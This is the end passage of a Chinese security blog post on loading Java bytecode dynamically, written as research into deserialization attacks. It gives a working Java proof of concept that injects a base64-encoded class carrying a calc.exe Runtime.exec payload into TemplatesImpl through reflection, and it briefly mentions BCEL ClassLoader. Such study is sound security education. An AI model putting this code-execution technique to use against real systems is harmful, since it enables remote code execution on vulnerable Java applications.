+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完整代码如上，执行过后就可成功弹出计算器，这是我们手动执行<code>newTransformer</code>触发的，我们还可以用cc链去触发，下篇文章再讲</p>
+<p><img src="https://s2.loli.net/2022/02/28/mxHZk7ozDtqcKyu.png" alt="image.png"></p>
+<h2 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h2><p>这种方法好像还挺重要的，而且生成的<code>bcel</code>字节码也挺奇怪的，这里是通过<code>BCEL</code>提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用<code>javac</code>命令来编译<code>java</code>文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码；有了字节码之后直接用<code>BCEL ClassLoader</code>加载就行了</p>
+<p>这种方法我还没细学，这儿就先不写了</p>
+<p>二月份的最后一篇文章咯，明天就是三月份啦，又是一年春天了，祝大家春天一切顺利！</p>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">Java动态加载字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%AD%97%E8%8A%82%E7%A0%81%E6%98%AF%E5%95%A5"><span class="toc-text">Java字节码是啥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLClassLoader%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8Bclass%E6%96%87%E4%BB%B6"><span class="toc-text">URLClassLoader加载远程class文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ClassLoader-defineClass%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">ClassLoader#defineClass直接加载字节码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">利用TemplatesImpl加载字节码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8BCEL-ClassLoader%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">利用BCEL ClassLoader加载字节码</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://arsenetang.github.io/2022/02/28/Java篇之动态加载字节码/">https://arsenetang.github.io/2022/02/28/Java篇之动态加载字节码/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
+
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+  
+    <a href="/2022/02/15/Java%E7%AF%87%E4%B9%8Bysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">Java篇之ysoserial中的一些操作</div>
+    </a>
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/02/28/Java%E7%AF%87%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">Java篇之Java动态加载字节码</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/15/Java%E7%AF%87%E4%B9%8Bysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/">Java篇之ysoserial中的一些操作</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/14/Java%E7%AF%87%E4%B9%8BCommonsCollections%206/">Java篇Commons-Collections 6</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/09/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(3)/">Java篇Commons-Collections 1 (3)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/06/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(2)/">Java篇Commons-Collections 1 (2)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Java/" style="font-size: 17.14px;">Java</a> <a href="/tags/RCE/" style="font-size: 12.86px;">RCE</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/ctf/" style="font-size: 18.57px;">ctf</a> <a href="/tags/php/" style="font-size: 15.71px;">php</a> <a href="/tags/wp/" style="font-size: 11.43px;">wp</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 14.29px;">反序列化</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+    </div>
+  </div>
+
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年02月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年11月</a><span class="archive-list-count">19</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/" rel="tag">AWD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">17</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-link"></i> 友情链接</h3>
+    <div class="widget">
+      <ul>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://blog.csdn.net/ATFWUS">ATFWUS</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.darry-long.top/">darry</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn">eeee</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://fmyyy.gitee.io/">fmyyy</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://felidaessolution.github.io/">FelidAE</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://101.34.46.94/ple3.com/">g1ory</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://jev0n.com/">Jev0n</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://l61q4cheng.github.io/">L61q4_Cheng</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://le1a.com/">le1a</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://81.68.112.193:8000/ltltlxey/">LTLT</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://l0v3ming.github.io/">l0v3ming</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://mochu.blog.csdn.net">mochu7</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722">NoViC4</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://blog.o3ev.cn/">o3Ev</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://www.pllrry.site">pl1rry</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://rasalghul-1.github.io/">Ra&#39;sAlGhul</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://rencvn.top/">RenCvn</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://yao-mou.gitee.io/friend/">Siebene@</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://zltt197.github.io/">zltt</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://blog.dadachd.top/">达达</a>
+        </li>
+      
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2022 Arsene.Tang.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        
+            <span>Count by <a href="http://busuanzi.ibruce.info/" target="_blank">busuanzi.</a></span>
+        
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+  
+<script src="/localshare/js/social-share.js"></script>
+
+  
+<script src="/localshare/js/qrcode.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
